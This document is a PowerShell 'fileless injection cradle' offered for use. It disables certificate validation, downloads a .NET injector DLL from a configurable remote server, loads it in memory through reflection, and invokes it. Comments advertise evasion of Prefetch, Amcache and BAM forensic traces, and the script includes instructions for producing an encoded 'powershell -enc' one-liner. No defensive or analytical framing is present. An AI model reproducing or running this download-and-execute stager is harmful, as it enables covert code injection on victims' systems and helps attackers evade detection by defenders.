# Fileless injection cradle — paste into any PowerShell terminal
# No files written to disk. Prefetch/Amcache/BAM see only powershell.exe.
#
# CONFIGURE: set your server host and port
# Then generate the one-liner:
#   $cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content cradle.ps1 -Raw)))
#   Write-Output "powershell -enc $cmd"

$H = "127.0.0.1"
$P = 8443

# bypass self-signed cert
[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# download the .NET injector assembly — never touches disk
$bytes = (New-Object Net.WebClient).DownloadData("https://${H}:${P}/injector.dll")

# load from memory — no temp file, no Prefetch entry for a custom binary
$asm = [Reflection.Assembly]::Load($bytes)

# clear download buffer
[Array]::Clear($bytes, 0, $bytes.Length)

# execute
$result = $asm.GetType("Svc.Loader").GetMethod("Run").Invoke($null, @($H, $P))

if ($result -eq 0) {
    Write-Host "[+] injected — cleaning memory traces..."
    Start-Sleep -Seconds 18
    Write-Host "[+] done"
} else {
    Write-Host "[!] failed ($result)"
}
